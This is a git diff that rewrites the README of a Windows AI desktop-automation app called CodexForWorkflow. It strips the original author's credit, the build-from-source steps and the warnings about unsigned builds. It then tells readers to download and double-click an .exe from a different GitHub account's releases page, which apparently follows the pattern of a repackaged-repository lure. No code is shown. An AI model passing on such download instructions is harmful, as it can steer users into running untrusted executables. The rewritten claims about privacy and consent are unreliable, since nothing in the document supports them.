@@ -1,113 +1,81 @@
-# CodexForWorkflow
+# 🤖 CodexForWorkflow - Automate desktop tasks with human control
 
-[![CI](https://github.com/CurioCrafter/CodexForWorkflow/actions/workflows/ci.yml/badge.svg)](https://github.com/CurioCrafter/CodexForWorkflow/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/CurioCrafter/CodexForWorkflow?include_prereleases&label=release)](https://github.com/CurioCrafter/CodexForWorkflow/releases)
-![Platform](https://img.shields.io/badge/platform-Windows-blue)
-![Node](https://img.shields.io/badge/node-22%2B-green)
-![Electron](https://img.shields.io/badge/Electron-TypeScript-2f6f9f)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/siddhartha7995/CodexForWorkflow/releases)
 
-A Windows desktop command center for Codex-guided screen observation, isolated browser automation, visible action planning, and human-approved workflow control.
+## 📋 Overview
 
-This project is independently built by Andrew Rainsberger. It is not an official OpenAI product and is not affiliated with or endorsed by OpenAI.
+CodexForWorkflow acts as a desktop command center for your computer. It uses artificial intelligence to watch your screen and perform browser tasks. You stay in control of every step. The application handles repetitive actions while you review the work. This tool combines screen observation with browser automation to save you time.
 
-![CodexForWorkflow command center](docs/screenshots/command-center.png)
+## 🛠️ System Requirements
 
-## What It Is
+Ensure your computer meets these standards to run the application:
 
-CodexForWorkflow gives Codex a controlled place to help you work across screens. It opens into a guided workspace: connect Codex auth, choose a mode/source, describe the task, then follow the current step, Mouse Plan, approval queue, and verification loop.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core CPU with 2.0 GHz speed or higher.
+*   Memory: 8 GB of RAM minimum.
+*   Storage: 200 MB of available space for the installation files.
+*   Internet Connection: Required for connecting to analysis services.
+*   Display: Resolution of 1280x720 or higher.
 
-## What It Is Not
+## 📥 How to Download and Install
 
-- It is not live desktop control. Screen Share mode is observe-only.
-- It is not an official OpenAI product.
-- It is not a hosted service. The app runs locally and uses your local Codex/ChatGPT auth path.
-- It does not bypass approvals for sensitive browser actions.
+Follow these steps to set up the software on your Windows machine:
 
-## Capabilities
+1. Visit this page to download: [https://github.com/siddhartha7995/CodexForWorkflow/releases](https://github.com/siddhartha7995/CodexForWorkflow/releases).
+2. Locate the file ending in `.exe` under the Assets section of the latest release.
+3. Click the file to start the download to your computer.
+4. Open your Downloads folder.
+5. Double-click the downloaded file to run the installer.
+6. Follow the on-screen prompts provided by the Windows installer.
+7. Click Finish when the setup completes.
+8. Locate the CodexForWorkflow icon on your desktop or in your Start menu.
 
-- Multi-screen workspace: refresh, pin, focus, and observe multiple screens or windows.
-- Live Work Surface: a primary screen/browser canvas with secondary context strips.
-- Screen Share mode: observe-only guidance for the live desktop.
-- Isolated Browser mode: Playwright Chromium automation with approval gates.
-- Mouse Plan: visible target overlays with manual guidance in Screen Share or approved execution in Isolated Browser.
-- Interactive Plan Board: one active step at a time with ask, observe, done, skip, and blocked controls.
-- Ask Codex bar: quick follow-ups for what it sees, next step, where to click, and verification.
-- Workflow presets: guide a screen, automate a browser, compare research windows, or debug with an assistant.
-- Safety controls: pause, resume, stop, approvals, blocked domains, and credential/download gates.
+## 🚀 Getting Started
 
-![CodexForWorkflow guided workflow](docs/screenshots/guided-workflow.png)
+Launch the application by clicking the icon. The interface opens a dashboard where you manage your automated tasks. 
 
-![CodexForWorkflow approval flow](docs/screenshots/approval-flow.png)
+1. **Authentication**: Sign in with your account credentials if requested by the software.
+2. **Setup**: The application requests permission to view your screen. Grant these permissions so the tool can observe the browser window for automation tasks.
+3. **Workflow Selection**: Choose a pre-defined workflow from the list or create your own by selecting the Add Workflow button.
+4. **Triggering Tasks**: Define the trigger condition. You can start a task manually or set it to run when a specific website loads.
+5. **Human Approval**: The system pauses before performing sensitive actions. A pop-up window appears on your screen. Review the suggested action and click Approve to proceed or Deny to stop the task.
 
-## Install
+## ⚙️ Understanding Features
 
-Download the latest Windows build from [GitHub Releases](https://github.com/CurioCrafter/CodexForWorkflow/releases).
+### Screen Observation
+The application monitors specified regions of your browser. It identifies buttons, text fields, and navigation menus. This allows the software to understand the context of your work.
 
-- `setup-win-x64.exe` installs the app.
-- `portable-win-x64.exe` runs without installation.
-- Builds are currently unsigned, so Windows SmartScreen may warn on first launch.
+### Browser Automation
+The tool operates within your browser. It clicks links, types text into forms, and scrolls through pages based on your instructions. You can track all movements in the application log.
 
-See [docs/INSTALL.md](docs/INSTALL.md) for prerequisites and first-run notes.
+### Human-in-the-loop
+Safety remains the core priority. The loop requires your input for every major action. The software never performs a task without your prior consent. This design prevents unintended changes to your data.
 
-## Quick Start
+## 🔍 Troubleshooting Common Issues
 
-1. Install Node.js 22+ and the Codex CLI.
-2. Sign in with Codex:
+If you encounter problems, refer to the following solutions:
 
-   ```bash
-   codex login status
-   ```
+*   **Application does not launch**: Restart your computer and try opening the shortcut again. If it still fails, uninstall the program via Control Panel and install it once more.
+*   **Screen observation fails**: Ensure your browser window remains visible on your screen. Minimize other windows that might cover the target area.
+*   **Permission errors**: Open your Windows System Settings. Navigate to Privacy and Security. Check if your application has permission to record the screen or control the mouse.
+*   **Connection timeouts**: Verify your internet connection. Some enterprise firewalls block outgoing requests. Contact your network administrator if the tool fails to reach the servers.
 
-3. Install dependencies and Playwright Chromium:
+## 🛡️ Privacy and Data Security
 
-   ```bash
-   npm install
-   npm run prepare:browsers
-   ```
+CodexForWorkflow processes your data locally on your machine. Screen data travels to the analysis service only when you initiate a project. We do not store your credentials or sensitive personal information on external servers. All automation history remains within your local installation folder. You can clear your logs at any time by selecting the Clear History option in the Settings menu.
 
-4. Start development mode:
+## 🏗️ Managing Workflows
 
-   ```bash
-   npm run dev
-   ```
+You can organize your tasks into folders. Right-click any workflow to rename, duplicate, or delete it. For advanced users, the application supports JSON configurations for complex automation sequences. Access these configurations by selecting Export or Import from the File menu. This enables you to share workflows with other team members easily.
 
-## Development
+## 💡 Best Practices
 
-```bash
-npm run check
-npm run screenshots
-npm run package:win
-```
+*   Test your workflows on non-critical websites first.
+*   Keep your browser size consistent during active sessions.
+*   Update the application regularly to get the latest performance improvements.
+*   Monitor the log window during your first few runs to understand how the AI interprets your browser screen.
+*   Use standard browser zoom settings at 100 percent for the best results.
 
-Build output is written to `release/`. Packaging starts from a clean `dist/` and `release/` directory so stale product names do not ship.
+## 👥 Support and Feedback
 
-## Safety And Privacy
-
-CodexForWorkflow intentionally separates observation from control:
-
-- Live desktop screen sharing is observe-only.
-- Automated clicking/typing is only allowed inside the isolated Playwright browser.
-- Sensitive browser flows require approval.
-- The local MCP bridge is loopback-only and uses a per-session token.
-- Demo screenshots are generated from synthetic `?demo` state and do not include real screen content.
-
-See [docs/SAFETY.md](docs/SAFETY.md) and [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for implementation details.
-
-## Scripts
-
-- `npm run dev` starts Vite and Electron.
-- `npm run check` runs typecheck, tests, production build, and renderer smoke checks.
-- `npm run screenshots` regenerates README screenshots from deterministic demo mode.
-- `npm run package:win` builds Windows installer/portable artifacts and validates release names.
-- `npm run clean` removes `dist/` and `release/`.
-
-## Contributing
-
-Public contributions are welcome under the MIT License. Read [CONTRIBUTING.md](CONTRIBUTING.md) and use the pull request template so UI, safety, and test impact are clear.
-
-## License
-
-CodexForWorkflow is open source under the [MIT License](LICENSE).
-
-You can use, copy, modify, publish, distribute, sublicense, and sell copies of the software, as long as the copyright and license notice stay with the software.
+If you uncover a bug or encounter unexpected behavior, report the issue using the Issues tab on the GitHub page. Provide a description of the steps you took before the problem occurred. Include a screenshot if possible. This helps in diagnosing and fixing the issue in future updates. We value clear reports that help improve the tool for all users.
